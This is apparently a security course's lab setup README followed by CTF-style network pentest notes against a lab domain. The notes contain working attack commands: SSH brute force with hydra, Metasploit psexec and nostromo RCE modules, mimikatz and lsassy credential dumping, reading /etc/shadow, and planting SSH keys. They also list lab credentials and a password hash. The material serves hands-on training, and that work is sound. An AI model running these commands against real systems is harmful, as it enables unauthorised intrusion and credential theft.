# Hacker-Fundamentals
Welcome to the Hacker Fundamentals lab setup page !

To be able to participate in the lab exercises and CTF in this course you will need to have:
* An OS on which you will download a VM 
* A VM, either VirtualBox or VMWare 

1) Downloading a VM 
* If you would like to download VirtualBox, please see the instructions at the following URL: 
  https://www.virtualbox.org/wiki/Downloads
* If you would like to download VirtualBox, please see the instructions at the following URL:
  https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html

2) Download Kali VM Image
A Kali VM image has been provided to you at <URL>, depending on your VM of choice please download the appropriate file (VirtualBox or VMWare)
Once the file has downloaded, unzip the file contents and click on the kali-linux-rolling-virtualbox-amd64.vbox file in order to load the Kali image into VirtualBox and if you use VMWare, drag the file to the VMWare application.

3) Downloading a VPN profile 
On your Kali VM, Please visit <URL> , and download the vpn profile that the course instructors have assigned to you. 

4) Load the VPN profile 
Once the VPN profile has been downloaded on your Kali image, open terminal and type the following command :  ``` sudo openvpn --config your_vpn_file.ovpn ```
**Do not close the terminal window where you established a VPN connection, as that will close the connection**

5) Test the VPN connection
Open a new terminal window and type the following command: ```ping IP```, 
if you receive an ICMP response, the connection works and you are now in the lab environment.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  Captain Crunch - Network Pentest
May 29, 2023
--------------------------------

Information provided by client:

domain: captaincrunch.co
IP networks: 10.10.10.0/24, 10.10.30.0/24

blee : 3120f299755272e11e898989265a2196


External Reconnaissance
-----------------------

All whois information redacted by registrar

Monica Garfield works as developer at CC
	Mentions foxtrot container on LinkedIn
	DNS recon found foxtrot.captaincrunch.co host at 64.226.83.128

	Able to login to foxtrot (10.10.10.11) via ssh brute force as Monica!

	hydra -l monica -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.11:22 -t 4

	What if Monica is a user on a Windows system that she does dev work from?

	Let's try using metasploit as her to login to a windows hosts

	msfconsole
	search psexec
	use windows/smb/psexec
	set rhosts 10.10.30.11
	set smbdomain captaincrunch.co
	set smbuser monica.garfield
	set smbpass tinkerbell
	exploit



Mimikatz:

	shell
	cd c:\tools
	.\mimikatz.exe
	sekurlsa::logonpasswords

Impacket:

impacket-psexec monica.garfield@10.10.30.11


DNS Recon
---------

fierce --domain captaincrunch.co
gobuster dns -d captaincrunch.co -w /usr/share/wordlists/amass/subdomains.lst -i

charlie.captaincrunch.co [64.226.83.119]
delta.captaincrunch.co [64.226.105.183]
echo.captaincrunch.co [64.226.83.135]
foxtrot.captaincrunch.co [64.226.83.128]
golf.captaincrunch.co [64.226.102.67]
india.captaincrunch.co [64.226.110.16]
juliet.captaincrunch.co [142.93.105.226]


Commands used:

cat external | cut -d " " -f 2 | tr -d "[" | tr -d "]" > external.ips
nmap -iL external.ips -Pn --top-ports=1000 --open -oN external.nmap


Internal Recon
--------------

Discovery:
nmap -sn 10.10.10.0/24 > internal
nmap -sn 10.10.30.0/24 >> internal
cat internal | grep report | cut -d " " -f 5 > internal.ips

Port scans:

nmap -iL internal.ips --top-ports=1000 --open -oN internal-top-ports.nmap

With Metasploit:

msfdb init
msfconsole
db_nmap 10.10.10.0/24 -p-
db_nmap 10.10.30.0/24 -p-


Interesting Services:

ssh is open (10.10.10.2, 10.10.10.3, 10.10.10.8, 10.10.10.9)
12345 open on 10.10.10.12
31337 open on 10.10.10.9 (likely web server httpd 2.4.38)
	Running wordpress
	WPScan confirmed vulnerabilities 
8000 is open  on 10.10.10.9
55555 open 10.10.10.13 (simplehttpserver ?)
	/credit contains ssh key for tigerwoods
	dirb http://10.10.10.13:55555 /usr/share/wordlists/dirb/small.txt

10.10.30.10 likely domain controller (domain: captaincrunch.co)
Windows hosts (10.10.30.11, 10.10.30.12)
6666 open on 10.10.30.11
5984 and 49153 open on 10.10.30.20 (unusual ports = interesting)
	5984 running couchdb 1.6.0 (RCE available!!)
	49153 running nostromo 1.9.6 (RCE available!!!)
		Exploited with Metasploit
		msfconsole
		use (multi/http/nostromo_code_exec
		set rhost 10.10.30.20
		set rport 32768
		set lhost tun0
		exploit
		

SSH keygen

	ssh-keygen
	enter - enter - enter
	ssh monica@10.10.10.11    tinkerbell
	nano ~/.ssh/authorized_keys
	paste PUBLIC key here
	exit 
	ssh -i private_key monica@10.10.10.11


Linux PrivEsc
	
	./linpeas.sh
	sudo -l
	sudo cat /etc/shadow

Tigerwoods lateral movement:

	ls -la
	chmod 600 tigerwoodskey
	ssh -i tigerwoods@10.10.10.10
	Try to put your private key in authorized_keys like before to get access with your private key

Windows Post Exploitation:

	net user
	net user /domain
	net group "Domain Admins" /domain
	


Commands:

wpscan --url http://10.10.10.9:31337
nikto -host 10.10.10.13 -port 55555

 crackmapexec smb 10.10.30.11 -u monica.garfield -p tinkerbell -M lsassy
